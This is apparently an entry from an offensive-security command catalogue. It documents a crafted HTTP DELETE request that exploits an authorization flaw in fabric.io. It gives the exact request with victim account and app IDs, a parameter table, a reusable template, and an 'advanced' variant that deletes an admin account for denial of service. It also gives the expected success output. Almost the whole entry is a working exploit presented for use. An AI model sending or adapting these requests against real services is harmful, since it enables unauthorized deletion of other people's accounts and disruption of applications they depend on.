---
data: >-
  DELETE /accounts/54af48304d8f5b12ff0000fd?app_id=54ad5e03a25bb8136b000002
  HTTP/1.1

  Host: fabric.io
tags:
  - http
  - delete
  - exploit
  - bypass
type: command
output: 'HTTP 200 OK or equivalent, despite unauthorized access'
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:44.795Z'
id: e6b401dc-31a2-4d05-9480-23d3b0eca7a3
verified: false
validated: true
submitted: true
---
# fabric-delete-team-member-modified

## Command

```http
DELETE /accounts/54af48304d8f5b12ff0000fd?app_id=54ad5e03a25bb8136b000002 HTTP/1.1
Host: fabric.io
```

## Description

This modified HTTP DELETE request exploits Fabric.io's authorization flaw by targeting a user account in an unauthorized application, removing them without proper access checks. Used after tampering with intercepted parameters.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| account_id | ID of the victim user to delete (e.g., 54af48304d8f5b12ff0000fd for Alicemember) | Yes |
| app_id | ID of the unauthorized target app (e.g., 54ad5e03a25bb8136b000002 for VictimApp) | Yes |

## Examples

### Basic Usage

```http
DELETE /accounts/{victim_account_id}?app_id={victim_app_id} HTTP/1.1
Host: fabric.io
```

### Advanced Usage

For DoS, target admin account:

```http
DELETE /accounts/54aa4c616bb166b8f300134a?app_id=54ad5e03a25bb8136b000002 HTTP/1.1
Host: fabric.io
```

## Expected Output

HTTP 200 OK response, indicating successful deletion even though the requester lacks app access; no error for authorization failure.

## Related

- [[commands/fabric-delete-team-member-original]]
- [[procedures/Modify-and-Replay-DELETE-Request-for-Unauthorized-Deletion]]
